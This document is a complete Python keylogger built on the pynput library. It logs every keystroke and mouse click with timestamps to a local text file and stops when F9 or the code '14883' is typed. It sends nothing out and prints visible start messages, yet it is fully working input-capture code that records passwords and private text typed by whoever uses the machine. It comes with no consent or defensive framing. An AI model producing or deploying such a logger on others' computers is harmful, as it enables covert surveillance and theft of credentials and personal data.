from pynput import keyboard, mouse
import os
from datetime import datetime
import threading

output_dir = "Desktop"
output_file = os.path.join(output_dir, "log.txt")
stop_key = "f9"
password = "14883"
buffer = []
stop_event = threading.Event()
kb_listener = None
mouse_listener = None

if not os.path.exists(output_dir) and output_dir != "":
    os.makedirs(output_dir)

def write_to_file(text: str):
    with open(output_file, "a", encoding="utf-8") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] {text}\n")

def normalize_key(k):
    if isinstance(k, keyboard.KeyCode):
        return k.char
    else:
        name = getattr(k, "name", None)
        if name:
            return name
        s = str(k)
        if s.startswith("Key."):
            return s.split(".", 1)[1]
        return s

def stop_all():
    try:
        if kb_listener is not None:
            kb_listener.stop()
    except Exception:
        pass
    try:
        if mouse_listener is not None:
            mouse_listener.stop()
    except Exception:
        pass
    stop_event.set()
    print("Script terminato")

def on_press(key):
    try:
        key_str = normalize_key(key)
    except Exception:
        key_str = None
    if key_str is None:
        write_to_file(f"<{key}>")
    else:
        if len(key_str) == 1:
            write_to_file(key_str)
        elif key_str in ["space", "enter", "tab"]:
            write_to_file(f"[{key_str.upper()}]")
        else:
            write_to_file(f"<{key_str}>")
    if key_str == stop_key:
        stop_all()
        return False
    buffer.append(key_str if key_str is not None else "")
    if len(buffer) > len(password):
        buffer.pop(0)
    if "".join(buffer) == password:
        stop_all()
        return False

def on_click(x, y, button, pressed):
    action = "PRESS" if pressed else "RELEASE"
    write_to_file(f"[MOUSE {action}] {button} at ({x}, {y})")

if __name__ == "__main__":
    print("Script avviato")
    kb_listener = keyboard.Listener(on_press=on_press)
    mouse_listener = mouse.Listener(on_click=on_click)
    kb_listener.start()
    mouse_listener.start()
    stop_event.wait()